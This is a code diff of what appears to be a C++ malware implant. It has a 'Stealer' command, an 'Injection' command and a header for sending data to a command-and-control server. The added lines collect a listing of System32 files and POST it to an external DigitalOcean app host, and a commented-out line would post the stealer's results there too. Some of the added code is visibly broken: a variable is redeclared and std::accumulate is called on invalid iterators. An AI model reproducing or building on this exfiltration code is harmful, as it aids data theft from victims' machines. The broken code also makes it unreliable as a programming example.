@@ -10,6 +10,7 @@
 #include "..\Feiyu\sendToC2\Post.h"
 #include "..\HTTPstuff.h"
 
+
 using json = nlohmann::json;
 #define BUF_SIZE 4096
 
@@ -171,6 +172,10 @@ int parseArgs(){
         if (command.compare("Stealer") == 0){
             printf("in stealer \n");
              res = driver();
+             std::string result=res.dump();
+            //std::string item = makePostRequest(L"sea-lion-app-f5nrq.ondigitalocean.app", L"/response",result.c_str());
+            
+
              //std::cout << res;
             //perform error checking then post
 
@@ -201,13 +206,20 @@ int parseArgs(){
             printf("WHERE IS THIS???\n");
             std::string s = std::string("C:\\Windows\\System32");
             std::vector<string> r (getFileNamesFromPath(s));
-            //for (auto iter : r ){
-              //  std::cout << iter << '\n';
-            //}
-            std::string item = makeHttpRequest("sea-lion-app-f5nrq.ondigitalocean.app", 443, "/response", 1);
-            std::cout << item;
+            std::stringstream ss;
+            for (auto it = r.begin(); it != r.end(); it++)
+            {
+                if (it != r.begin())
+                {
+                    ss << " ";
+                }
+                ss << *it;
+            };
+            std::string s = std::accumulate(ss.begin(), v.end(), std::string{});
+
             //    /response
-            
+            std::string item = makePostRequest(L"sea-lion-app-f5nrq.ondigitalocean.app", L"/response",s);
+            std::cout << item;
 
         } else if (command.compare("Injection") == 0){
             printf("INJECTION\n");
